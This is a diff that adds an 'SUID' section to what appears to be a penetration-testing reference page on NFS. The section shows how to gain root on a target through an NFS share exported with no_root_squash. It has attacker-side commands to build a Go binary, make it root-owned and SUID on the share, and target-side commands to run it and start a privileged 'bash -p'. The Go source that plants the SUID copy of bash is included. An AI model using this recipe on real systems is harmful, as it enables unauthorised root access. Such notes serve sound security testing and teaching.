@@ -59,3 +59,74 @@ mount -t nfs IP:/DIRECTORY /mnt/MOUNT -o nolock
 no_root_squash
 rw
 ```
+
+---
+
+## SUID
+
+
+:::danger Only Possible If **`no_root_squash`** is Enabled
+
+:::
+
+<br/>
+
+- `LOCAL`
+
+```batch
+:: Build 
+:: This is going to Generate a Binary Named [setuid]
+go build ./setuid.go
+
+:: Copy the Binary to the NFS Share and Set the Permissions
+cp setuid /NFS/SHARE
+
+:: Permissions
+sudo chown root:root setuid
+
+:: SUID
+sudo chmod +s setuid
+```
+
+- `TARGET`
+
+```batch
+:: Executing the Binary is going to create a BASH Binary with SUID Bit
+./setuid
+
+:: Run the BASH Binary Maintaining the Permissions
+./bash -p
+```
+
+```go
+package main
+
+import (
+	"fmt"
+	"os/exec"
+	"runtime"
+)
+
+func execute() {
+
+	out, err := exec.Command("cp", "/bin/bash", ".").Output()
+	out, err = exec.Command("chmod", "+s", "./bash").Output()
+	
+	if err != nil {
+		fmt.Printf("%s", err)
+	}
+
+    output := string(out[:])
+    fmt.Println(output)
+    
+}
+
+func main() {
+	if runtime.GOOS == "Windows" {
+		fmt.Println("Can't Execute this on a Windows Machine.")
+	} else {
+		fmt.Println("Detected Linux Machine Executing.")
+		execute()
+	}
+}
+```
